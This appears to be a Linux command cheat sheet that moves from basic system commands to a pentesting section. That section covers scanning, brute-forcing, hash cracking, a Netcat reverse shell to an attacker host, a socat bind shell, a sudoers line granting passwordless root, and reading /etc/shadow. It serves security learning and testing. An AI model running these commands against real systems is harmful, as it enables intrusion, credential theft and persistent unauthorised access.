### Basic Linux Commands

### System Information
- `whoami` – Display the current user
- `id` – Show user and group IDs
- `uname -a` – Show system information
- `uptime` – Display system uptime
- `df -h` – Show disk usage
- `du -sh *` – Show directory sizes
- `free -m` – Show memory usage
- `ps aux` – List running processes
- `top` – Monitor system processes
- `kill -9 <PID>` – Kill a process by PID
- `crontab -l` – List scheduled cron jobs
- `history` – Show command history
- `echo $SHELL` – Show default shell
- `lsb_release -a` – Show OS details

### File & Directory Management
- `ls -lah` – List files with details
- `cd /path/to/directory` – Change directory
- `pwd` – Print working directory
- `mkdir newfolder` – Create a new folder
- `rm -rf folder` – Delete a folder recursively
- `cp file1 file2` – Copy files
- `mv oldname newname` – Rename or move files
- `find / -name "*.conf"` – Find config files
- `grep -r "password" /etc/` – Search for passwords in files
- `cat file.txt` – View file content
- `less file.txt` – View file content with scrolling

### User & Permission Management
- `adduser username` – Add a new user
- `passwd username` – Change user password
- `su - username` – Switch user
- `groups username` – Show user groups
- `chmod 777 file` – Change file permissions
- `chown user:group file` – Change file ownership
- `sudo -l` – List sudo privileges
- `visudo` – Edit sudoers file

### Networking & Connectivity
- `ifconfig` or `ip a` – Show network interfaces
- `ping -c 4 <target>` – Check host availability
- `traceroute <target>` – Trace packet route
- `netstat -tulnp` – Show open ports
- `ss -tulnp` – Alternative to netstat
- `arp -a` – Show ARP table
- `nc -lvnp <port>` – Open a Netcat listener
- `curl -I <URL>` – Get HTTP headers
- `wget <URL>` – Download files
- `scp user@host:/file /local/path` – Copy files via SSH
- `rsync -avz user@host:/dir /local/dir` – Sync directories over SSH

---

### Hacking & Pentesting Commands

### Reconnaissance & Scanning
- `nmap -sV -A <target>` – Scan open ports with service detection
- `nmap -Pn -p- <target>` – Full port scan ignoring ping
- `nmap --script=vuln <target>` – Scan for vulnerabilities
- `nikto -h <target>` – Scan web servers for vulnerabilities
- `whatweb <URL>` – Identify web technologies
- `dnsenum <domain>` – Enumerate DNS records
- `dig @8.8.8.8 <domain>` – Get DNS info
- `whois <domain>` – Get domain registration details
- `theHarvester -d <domain> -l 500 -b google` – Gather emails & subdomains
- `sublist3r -d <domain>` – Find subdomains

### Password Cracking & Exploitation
- `hydra -L users.txt -P passwords.txt <service>://<target>` – Brute-force login
- `john --wordlist=rockyou.txt hash.txt` – Crack hashes with John
- `hashcat -m 0 hash.txt rockyou.txt` – Crack hashes with Hashcat
- `sqlmap -u <URL> --dbs` – Test SQL injection
- `searchsploit <keyword>` – Find exploits in Exploit-DB
- `msfconsole` – Open Metasploit Framework
- `exploit/multi/handler` – Start Metasploit reverse shell listener
- `evil-winrm -i <target> -u <user> -p <password>` – Exploit Windows via WinRM
- `smbclient -L //<target>` – List SMB shares
- `enum4linux -a <target>` – Enumerate Windows shares & users

### Reverse Shell & Privilege Escalation
- `nc -e /bin/bash <attacker-ip> <port>` – Reverse shell (Netcat)
- `python3 -c 'import pty; pty.spawn("/bin/bash")'` – Upgrade shell to TTY
- `echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` – Grant root access
- `find / -perm -u=s -type f 2>/dev/null` – Find SUID binaries
- `sudo -l` – List sudo permissions
- `getcap -r / 2>/dev/null` – Find files with special capabilities
- `linpeas.sh` – Automated privilege escalation scan
- `pspy64` – Monitor running processes for privilege escalation
- `gdb -q ./vulnerable` – Debug binaries for exploitation
- `strings ./binary | grep password` – Find sensitive data in binaries

### File & Directory Manipulation
- `tar -czf archive.tar.gz /path/to/files` – Compress files
- `unzip archive.zip -d /path/to/extract/` – Extract files
- `mount /dev/sdb1 /mnt/usb` – Mount USB drive
- `dd if=/dev/sda of=/mnt/backup.img` – Create disk image
- `cat /etc/passwd` – View system users
- `cat /etc/shadow` – View password hashes (requires root)

### Miscellaneous Hacking & Automation
- `socat TCP4-LISTEN:<port>,fork EXEC:/bin/bash` – Bind shell with Socat
- `base64 -d < file` – Decode Base64
- `xxd -r -p hex.txt > binary` – Convert hex to binary
- `crunch 8 10 abc123 -o wordlist.txt` – Generate wordlists
- `tmux` – Open a terminal multiplexer
- `proxychains nmap -sT -Pn <target>` – Use proxies for scans
- `torify curl <URL>` – Browse via Tor
- `exiftool image.jpg` – Extract metadata from images
